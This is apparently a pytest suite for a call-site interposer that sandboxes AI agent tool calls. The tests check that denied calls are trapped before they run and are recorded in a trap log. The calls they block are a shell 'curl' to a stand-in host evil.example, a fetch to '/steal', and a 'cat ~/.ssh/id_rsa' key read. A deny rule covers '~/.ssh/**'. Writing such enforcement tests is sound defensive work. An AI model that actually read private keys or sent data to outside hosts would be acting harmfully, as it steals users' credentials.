"""Tests for the call-site interposer — the enforcement guarantee.

The headline assertion (the m1 milestone's "demonstrable"): a denied call is
**never executed**, it is trapped at the call site and logged.
"""

from __future__ import annotations

import os

import pytest

from capsule.interpose import CapabilityViolation, Interposer
from capsule.policy import CallRequest
from capsule.profile import load_profile
from capsule.trap import TrapLog


def make_interposer(tmp_path, **profile_overrides):
    data = {
        "skill": "curl-exfil-demo",
        "default": "deny",
        "tools": ["read_file"],
        "paths": {"read": ["./**"], "write": [], "deny": ["~/.ssh/**"]},
        "network": {"allow": []},
    }
    data.update(profile_overrides)
    profile = load_profile(data, base_dir=str(tmp_path), source="<test>")
    return Interposer(profile, trap_log=TrapLog.in_memory(), emit=lambda _line: None)


# --------------------------------------------------------------------------- #
# Allowed call passes through
# --------------------------------------------------------------------------- #
def test_allowed_call_passes_through(tmp_path):
    interp = make_interposer(tmp_path)
    target = tmp_path / "notes.txt"

    ran = {"count": 0}

    def thunk():
        ran["count"] += 1
        return "file contents"

    result = interp.guard(
        CallRequest(tool="read_file", path=str(target)), thunk
    )
    assert result == "file contents"
    assert ran["count"] == 1
    assert interp.summary == {"allowed": 1, "blocked": 0, "total": 1}


# --------------------------------------------------------------------------- #
# Denied call is trapped BEFORE the thunk runs (the core guarantee)
# --------------------------------------------------------------------------- #
def test_denied_tool_blocks_and_thunk_never_runs(tmp_path):
    interp = make_interposer(tmp_path)

    side_effect = {"executed": False}

    def real_curl():
        side_effect["executed"] = True  # must NEVER happen
        return "exfiltrated"

    call = CallRequest(tool="shell", raw="curl https://evil.example", host="evil.example")
    with pytest.raises(CapabilityViolation) as exc:
        interp.guard(call, real_curl)

    assert side_effect["executed"] is False
    assert exc.value.decision.rule == "tool-not-in-profile"
    assert interp.summary == {"allowed": 0, "blocked": 1, "total": 1}


def test_denied_ssh_read_blocks_and_thunk_never_runs(tmp_path):
    # read_file IS allowed, but ~/.ssh/** is explicitly denied. The deny must
    # win and the actual file read must never happen.
    interp = make_interposer(tmp_path)

    opened = {"path": None}

    def real_read():
        opened["path"] = os.path.expanduser("~/.ssh/id_rsa")
        return "PRIVATE KEY"

    call = CallRequest(
        tool="read_file",
        path=os.path.expanduser("~/.ssh/id_rsa"),
        raw="cat ~/.ssh/id_rsa",
    )
    with pytest.raises(CapabilityViolation) as exc:
        interp.guard(call, real_read)

    assert opened["path"] is None
    assert exc.value.decision.rule == "path-denied"


# --------------------------------------------------------------------------- #
# wrap() decorator form
# --------------------------------------------------------------------------- #
def test_wrap_blocks_disallowed_call_before_func(tmp_path):
    interp = make_interposer(tmp_path)

    calls = []

    def fetch(url):
        calls.append(url)
        return "200 OK"

    checked_fetch = interp.wrap(
        fetch,
        lambda url, **_: CallRequest(tool="shell", host="evil.example", raw=f"GET {url}"),
    )

    with pytest.raises(CapabilityViolation):
        checked_fetch("https://evil.example/steal")

    assert calls == []  # fetch() never ran


def test_wrap_allows_permitted_call(tmp_path):
    interp = make_interposer(tmp_path)
    target = tmp_path / "a.txt"

    def read_file(path):
        return f"contents of {path}"

    checked = interp.wrap(
        read_file, lambda path, **_: CallRequest(tool="read_file", path=path)
    )
    assert checked(str(target)) == f"contents of {target}"


# --------------------------------------------------------------------------- #
# Trap log records both sides + persists to disk
# --------------------------------------------------------------------------- #
def test_trap_log_persists_and_reloads(tmp_path):
    log_path = tmp_path / ".capsule" / "trap.log"
    profile = load_profile(
        {
            "skill": "curl-exfil-demo",
            "default": "deny",
            "tools": ["read_file"],
            "paths": {"read": ["./**"]},
            "network": {"allow": []},
        },
        base_dir=str(tmp_path),
    )
    interp = Interposer(profile, trap_log=TrapLog.open(log_path), emit=lambda _l: None)

    interp.check(CallRequest(tool="read_file", path=str(tmp_path / "ok.txt")))
    with pytest.raises(CapabilityViolation):
        interp.check(CallRequest(tool="shell", raw="curl https://evil.example"))

    assert log_path.is_file()

    # A fresh log reading the same file sees both events.
    reloaded = TrapLog.open(log_path)
    reloaded.load()
    assert reloaded.summary() == {"allowed": 1, "blocked": 1, "total": 2}
    assert reloaded.blocked[0].rule == "tool-not-in-profile"
